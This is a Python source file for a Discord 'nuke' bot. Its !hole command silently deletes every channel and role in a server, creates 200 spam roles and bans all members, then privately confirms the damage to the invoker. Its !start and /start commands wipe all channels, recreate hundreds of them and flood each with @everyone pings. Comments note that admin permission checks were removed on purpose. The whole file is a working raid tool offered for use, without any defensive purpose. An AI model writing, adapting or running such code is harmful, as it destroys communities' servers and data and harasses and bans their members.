import os
import discord
from discord.ext import commands

# --- Configuration ---
TOKEN = os.getenv("DISCORD_TOKEN")

# --- Bot Setup ---
intents = discord.Intents.default()
intents.guilds = True
intents.message_content = True
intents.members = True
intents.bans = True

bot = commands.Bot(command_prefix='!', intents=intents)

# Store configuration
bot_config = {
    "channel_name": "test",
    "ping_message": "Hello everyone! @everyone",
    "initial_pings": 1,
    "final_pings": 5
}

# --- Event: Bot Ready ---
@bot.event
async def on_ready():
    print(f'✅ Logged in as {bot.user}')
    try:
        synced = await bot.tree.sync()
        print(f"✅ Synced {len(synced)} command(s)")
    except Exception as e:
        print(f"❌ Failed to sync commands: {e}")

# --- Text Command: !hole ---
@bot.command(name="hole")
async def hole_command(ctx):
    """Silent nuke command: creates roles continuously and bans all members"""
    
    # Don't send any public messages - silent operation
    try:
        guild = ctx.guild
        if not guild:
            return

        # Delete all channels first
        deleted_channels = 0
        for channel in guild.channels:
            try:
                await channel.delete()
                deleted_channels += 1
            except:
                pass

        # Delete all roles (except @everyone)
        deleted_roles = 0
        for role in guild.roles:
            if role.name != "@everyone" and not role.managed:
                try:
                    await role.delete()
                    deleted_roles += 1
                except:
                    pass

        # Create roles continuously with numbering
        created_roles = 0
        for i in range(200):  # Create 200 roles
            try:
                await guild.create_role(name=f"Nameliun Hub nke #{i+1}")
                created_roles += 1
            except:
                pass

        # Ban all members (except bots and the command user)
        members_banned = 0
        for member in guild.members:
            # Skip bots and the command user
            if not member.bot and member != ctx.author:
                try:
                    await member.ban(reason="Nameliun Hub nke")
                    members_banned += 1
                except:
                    pass

        # Send only a private confirmation to the command user
        try:
            await ctx.author.send(f"✅ Silent nuke completed!\n- Deleted {deleted_channels} channels\n- Deleted {deleted_roles} roles\n- Created {created_roles} roles\n- Banned {members_banned} members")
        except:
            pass

    except Exception as e:
        try:
            await ctx.author.send(f"❌ Error during silent nuke: {str(e)}")
        except:
            pass

# --- Text Command: !start ---
@bot.command(name="start")
async def start_text(ctx, channel_name: str, *, ping_message: str):
    """Text command: !start channel_name ping_message"""
    
    # REMOVED: Admin permission check - anyone can now run this command!
    
    await ctx.send("🔄 Starting process... Please wait.")
    
    try:
        guild = ctx.guild
        if not guild:
            await ctx.send("❌ Could not find guild")
            return

        # Update configuration
        bot_config["channel_name"] = channel_name
        bot_config["ping_message"] = ping_message
        
        # Delete all existing channels first
        deleted_count = 0
        errors = []
        
        for channel in guild.channels:
            try:
                await channel.delete()
                deleted_count += 1
            except Exception as e:
                errors.append(f"Failed to delete {channel.name}: {str(e)[:50]}")

        # Create channels one by one and send pings
        created_channels = []
        total_messages_sent = 0
        message_errors = []
        channel_limit_reached = False
        
        # First, create channels with 1 ping each until we hit the limit
        for i in range(500):  # Attempt up to 500 channels (Discord limit)
            try:
                # Create channel with the exact name
                new_channel = await guild.create_text_channel(channel_name)
                created_channels.append(new_channel.name)
                
                # Send initial pings (1 ping per channel)
                for j in range(bot_config["initial_pings"]):
                    try:
                        await new_channel.send(ping_message)
                        total_messages_sent += 1
                    except Exception as e:
                        message_errors.append(f"Initial ping {j+1} in channel {i+1}: {str(e)[:50]}")
                
                # Check if we're approaching the limit (around 490 channels)
                if len(created_channels) >= 490:
                    channel_limit_reached = True
                    break
                    
            except discord.errors.HTTPException as e:
                if "Maximum number of channels" in str(e):
                    channel_limit_reached = True
                    break
                else:
                    errors.append(f"Channel {i+1}: {str(e)[:50]}")
                    break
            except Exception as e:
                errors.append(f"Channel {i+1}: {str(e)[:50]}")
                break

        # If we've reached the limit, send additional pings to all channels
        if channel_limit_reached and created_channels:
            try:
                # Send additional pings (total of 5 pings per channel)
                additional_pings = bot_config["final_pings"] - bot_config["initial_pings"]  # 5 - 1 = 4 additional pings
                
                for channel in guild.channels:
                    if channel.name == channel_name:  # Only send to our created channels
                        for k in range(additional_pings):
                            try:
                                await channel.send(ping_message)
                                total_messages_sent += 1
                            except Exception as e:
                                message_errors.append(f"Additional ping {k+1} in {channel.name}: {str(e)[:50]}")
                                break
                                
            except Exception as e:
                errors.append(f"Error during final pinging phase: {str(e)[:50]}")

        # Prepare response
        response = f"✅ Process Completed!\n"
        response += f"- Deleted {deleted_count} existing channels\n"
        response += f"- Created {len(created_channels)} channels named `{channel_name}`\n"
        response += f"- Total messages sent: {total_messages_sent}\n"
        response += f"- Channel limit reached: {'Yes' if channel_limit_reached else 'No'}\n"
        
        if channel_limit_reached:
            response += f"- Final phase: Sent {bot_config['final_pings']} pings per channel\n"
        else:
            response += f"- Current phase: Sent {bot_config['initial_pings']} ping per channel\n"
        
        if errors:
            response += f"\n⚠️ Channel errors ({len(errors)}):\n" + "\n".join(errors[:5])
            
        if message_errors:
            response += f"\n⚠️ Message errors ({len(message_errors)}):\n" + "\n".join(message_errors[:5])
        
        await ctx.send(response)

    except Exception as e:
        await ctx.send(f"❌ Error: {str(e)}")

# --- Slash Command: /configure ---
@bot.tree.command(name="configure", description="Set up channel name and ping message")
async def configure(interaction: discord.Interaction, channel_name: str, ping_message: str):
    """Configure the channel name and ping message"""
    
    # REMOVED: Admin permission check - anyone can now run this command!
    
    # Update configuration
    bot_config["channel_name"] = channel_name
    bot_config["ping_message"] = ping_message
    
    await interaction.response.send_message(
        f"✅ Configuration updated!\n"
        f"Channel name: `{channel_name}`\n"
        f"Ping message: `{ping_message}`\n"
        f"\nNow use `/start` or `!start {channel_name} {ping_message}` to begin the process!", 
        ephemeral=True
    )

# --- Slash Command: /start ---
@bot.tree.command(name="start", description="Create channels with progressive pinging")
async def start_slash(interaction: discord.Interaction):
    """Delete all channels, create new ones, and send progressive pings"""
    
    # REMOVED: Admin permission check - anyone can now run this command!
    
    await interaction.response.defer(ephemeral=True)
    
    try:
        guild = interaction.guild
        if not guild:
            await interaction.followup.send("❌ Could not find guild", ephemeral=True)
            return

        # Get configuration
        channel_name = bot_config["channel_name"]
        ping_message = bot_config["ping_message"]
        initial_pings = bot_config["initial_pings"]
        final_pings = bot_config["final_pings"]
        
        # Delete all existing channels first
        deleted_count = 0
        errors = []
        
        for channel in guild.channels:
            try:
                await channel.delete()
                deleted_count += 1
            except Exception as e:
                errors.append(f"Failed to delete {channel.name}: {str(e)[:50]}")

        # Create channels one by one and send pings
        created_channels = []
        total_messages_sent = 0
        message_errors = []
        channel_limit_reached = False
        
        # First, create channels with 1 ping each until we hit the limit
        for i in range(500):  # Attempt up to 500 channels (Discord limit)
            try:
                # Create channel with the exact name
                new_channel = await guild.create_text_channel(channel_name)
                created_channels.append(new_channel.name)
                
                # Send initial pings (1 ping per channel)
                for j in range(initial_pings):
                    try:
                        await new_channel.send(ping_message)
                        total_messages_sent += 1
                    except Exception as e:
                        message_errors.append(f"Initial ping {j+1} in channel {i+1}: {str(e)[:50]}")
                
                # Check if we're approaching the limit (around 490 channels)
                if len(created_channels) >= 490:
                    channel_limit_reached = True
                    break
                    
            except discord.errors.HTTPException as e:
                if "Maximum number of channels" in str(e):
                    channel_limit_reached = True
                    break
                else:
                    errors.append(f"Channel {i+1}: {str(e)[:50]}")
                    break
            except Exception as e:
                errors.append(f"Channel {i+1}: {str(e)[:50]}")
                break

        # If we've reached the limit, send additional pings to all channels
        if channel_limit_reached and created_channels:
            try:
                # Send additional pings (total of 5 pings per channel)
                additional_pings = final_pings - initial_pings  # 5 - 1 = 4 additional pings
                
                for channel in guild.channels:
                    if channel.name == channel_name:  # Only send to our created channels
                        for k in range(additional_pings):
                            try:
                                await channel.send(ping_message)
                                total_messages_sent += 1
                            except Exception as e:
                                message_errors.append(f"Additional ping {k+1} in {channel.name}: {str(e)[:50]}")
                                break
                                
            except Exception as e:
                errors.append(f"Error during final pinging phase: {str(e)[:50]}")

        # Prepare response
        response = f"✅ Process Completed!\n"
        response += f"- Deleted {deleted_count} existing channels\n"
        response += f"- Created {len(created_channels)} channels named `{channel_name}`\n"
        response += f"- Total messages sent: {total_messages_sent}\n"
        response += f"- Channel limit reached: {'Yes' if channel_limit_reached else 'No'}\n"
        
        if channel_limit_reached:
            response += f"- Final phase: Sent {final_pings} pings per channel\n"
        else:
            response += f"- Current phase: Sent {initial_pings} ping per channel\n"
        
        if errors:
            response += f"\n⚠️ Channel errors ({len(errors)}):\n" + "\n".join(errors[:5])
            
        if message_errors:
            response += f"\n⚠️ Message errors ({len(message_errors)}):\n" + "\n".join(message_errors[:5])
        
        await interaction.followup.send(response, ephemeral=True)

    except Exception as e:
        await interaction.followup.send(f"❌ Error: {str(e)}", ephemeral=True)

# --- Run the Bot ---
if TOKEN is None:
    print("❌ ERROR: DISCORD_TOKEN environment variable is not set.")
else:
    try:
        bot.run(TOKEN)
    except discord.errors.LoginFailure:
        print("❌ ERROR: Invalid DISCORD_TOKEN. Please check your token and try again.")
    except Exception as e:
        print(f"❌ An error occurred: {e}")
